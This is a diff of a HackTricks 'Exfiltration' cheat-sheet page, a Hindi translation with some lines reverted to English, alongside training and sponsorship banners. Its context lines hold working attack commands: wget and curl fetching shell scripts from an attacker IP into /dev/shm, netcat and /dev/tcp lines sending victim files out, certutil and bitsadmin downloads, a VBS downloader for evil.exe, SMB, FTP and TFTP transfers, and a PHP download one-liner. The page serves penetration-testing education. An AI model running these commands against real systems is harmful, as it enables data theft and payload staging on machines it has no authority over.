@@ -1,40 +1,32 @@
 # Exfiltration
 
 {% hint style="success" %}
-सीखें और प्रैक्टिस करें AWS हैकिंग:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-सीखें और प्रैक्टिस करें GCP हैकिंग: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>हैकट्रिक्स का समर्थन करें</summary>
+<summary>Support HackTricks</summary>
 
-* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
-* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **हमें** **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard सिक्योरिटी ग्रुप**
+## सामान्य रूप से व्हाइटलिस्टेड डोमेन जानकारी निकालने के लिए
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+जानकारी निकालने के लिए सामान्य रूप से व्हाइटलिस्टेड डोमेन खोजने के लिए [https://lots-project.com/](https://lots-project.com/) देखें
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
+## Copy\&Paste Base64
 
-***
-
-## सामान्यत: व्हाइटलिस्टेड डोमेन्स जिनसे सूचना निकाली जा सकती है
-
-[https://lots-project.com/](https://lots-project.com/) पर जांच करें कि कौन से सामान्यत: व्हाइटलिस्टेड डोमेन्स का दुरुपयोग किया जा सकता है
-
-## कॉपी\&पेस्ट बेस64
-
-**लिनक्स**
+**Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**विंडोज**
+**विंडोज़**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -48,7 +40,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**Windows**
+**विंडोज़**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -123,7 +115,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP सर्वर (पायथन)
+### FTP सर्वर (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -133,7 +125,7 @@ python3 -m pyftpdlib -p 21
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP सर्वर (प्योर-एफटीपी)
+### FTP सर्वर (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** ग्राहक
+### **Windows** क्लाइंट
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -164,14 +156,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-काली को सर्वर के रूप में
+Kali सर्वर के रूप में
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-या samba का उपयोग करके एक smb साझा बनाएं:
+या smb शेयर **samba का उपयोग करके** बनाएं:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -186,7 +178,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows के लिए एक्सफिल्ट्रेशन
+Windows
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -196,13 +188,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-हमलावर को SSHd चल रहा होना चाहिए।
+हमलावर के पास SSHd चलाना आवश्यक है।
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से हमलावर तक एक निर्देशिका माउंट कर सकता है।
+यदि पीड़ित के पास SSH है, तो हमलावर पीड़ित से एक निर्देशिका को हमलावर पर माउंट कर सकता है।
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -215,12 +207,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### पीड़ित से फ़ाइल डाउनलोड
+### पीड़ित से फ़ाइल डाउनलोड करें
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### विक्टिम को फ़ाइल अपलोड करें
+### पीड़ित को फ़ाइल अपलोड करें
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -249,33 +241,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-यदि आप एक SMTP सर्वर को डेटा भेज सकते हैं, तो आप पायथन के साथ डेटा प्राप्त करने के लिए एक SMTP बना सकते हैं:
+यदि आप डेटा को SMTP सर्वर पर भेज सकते हैं, तो आप डेटा प्राप्त करने के लिए पायथन के साथ एक SMTP बना सकते हैं:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इंस्टॉलेशन के दौरान विशेष रूप से जोड़ना चाहिए)
+डिफ़ॉल्ट रूप से XP और 2003 में (अन्य में इसे स्थापना के दौरान स्पष्ट रूप से जोड़ा जाना चाहिए)
 
-काली में, **TFTP सर्वर शुरू करें**:
+Kali में, **TFTP सर्वर शुरू करें**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**पायथन में TFTP सर्वर:**
+**TFTP सर्वर पायथन में:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-**विक्टिम** में, Kali सर्वर से कनेक्ट करें:
+In **victim**, Kali सर्वर से कनेक्ट करें:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP वनलाइनर के साथ एक फ़ाइल डाउनलोड करें:
+एक PHP oneliner के साथ एक फ़ाइल डाउनलोड करें:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -315,35 +307,33 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-## डीबग.एक्सई
+## Debug.exe
 
-`डीबग.एक्सई` प्रोग्राम न केवल बाइनरी की जांच की अनुमति देता है बल्कि **हेक्स से उन्हें पुनः निर्माण करने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी के हेक्स प्रदान करके, `डीबग.एक्सई` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालांकि, यह महत्वपूर्ण है कि डीबग.एक्सई का एक **सीमितांकन है जो 64 केबी के आकार तक फ़ाइलों को आसेंबल करने की है**।
+The `debug.exe` प्रोग्राम न केवल बाइनरी की जांच करने की अनुमति देता है बल्कि इसमें **हैक्स से उन्हें फिर से बनाने की क्षमता भी है**। इसका मतलब है कि एक बाइनरी का हैक्स प्रदान करके, `debug.exe` बाइनरी फ़ाइल उत्पन्न कर सकता है। हालाँकि, यह ध्यान रखना महत्वपूर्ण है कि debug.exe में **64 kb आकार तक फ़ाइलों को असेंबल करने की एक सीमा है**।
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+फिर टेक्स्ट को विंडोज-शेल में कॉपी-पेस्ट करें और एक फ़ाइल nc.exe बनाई जाएगी।
+
+* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-**AWS हैकिंग सीखें और प्रैक्टिस करें:** [**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)\
-**GCP हैकिंग सीखें और प्रैक्टिस करें:** [**HackTricks Training GCP Red Team Expert (GRTE)**](https://training.hacktricks.xyz/courses/grte)
+AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>हैकट्रिक्स का समर्थन करें</summary>
+<summary>HackTricks का समर्थन करें</summary>
 
-* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
-* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
-* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** और **हैकट्रिक्स क्लाउड** github रेपो में PR जमा करके।
+* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
+* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो करें।**
+* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PR सबमिट करें।
 
 </details>
 {% endhint %}
